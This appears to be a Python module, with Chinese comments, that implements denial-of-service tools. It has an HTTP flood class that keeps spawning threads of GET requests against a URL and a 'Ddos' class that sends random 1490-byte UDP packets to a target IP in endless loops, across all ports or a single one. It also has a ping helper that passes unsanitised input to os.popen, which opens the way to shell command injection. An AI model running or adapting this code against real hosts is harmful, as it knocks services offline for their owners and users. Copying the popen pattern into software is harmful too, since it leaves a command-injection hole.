import os,socket,threading,requests,meo,random

headers = {
    "User-Agent": meo.net.UserAgent.FIREFOX.value
}

#本机信息
from .hostinfo import Hostinfo

# ping
def ping(host):
    return os.popen("ping "+ host).read()

# 获取ip
def getip(name):
    try:
        return socket.gethostbyname(name)
    except:
        return None



# 洪水攻击
class Attack:
    def attack(self):
        for i in range(self.speed):
            try:
                r = requests.get(self.url, self.headers)
                self.collector['success'] += 1
            except:
                # 发送失败
                self.collector['err'] += self.speed - i
                break
    def startattack(self):
        while True:
            t = threading.Thread(target=self.attack, args=())
            t.start()
    def __init__(self, url, speed, headers=headers):
        self.url = url
        self.speed = speed
        self.headers = headers
        self.collector = {
            "success": 0,
            "err": 0,
        }


class Ddos:
    # 泛洪攻击
    def all(self):
        self.data['port'] = self.port
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        while True:
            sock.sendto(bytes, (self.ip,self.data['port']))
            self.data['sent'] += 1
            self.data['port'] += 1
            if self.data['port'] == 65534:
                self.data['port'] = 1
    # 洪攻击
    def one(self):
        self.rport = self.port
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        
        while True:
            sock.sendto(bytes, (self.ip,self.port))
            self.data['sent'] += 1
    def __init__(self, ip, port = 1):
        self.sent = 0
        self.ip = ip
        self.port = port
        self.data = {
            "sent": 0,
            "port": 0,
        }



if __name__ == "__main__":
    print(ping('8.8.8.8'))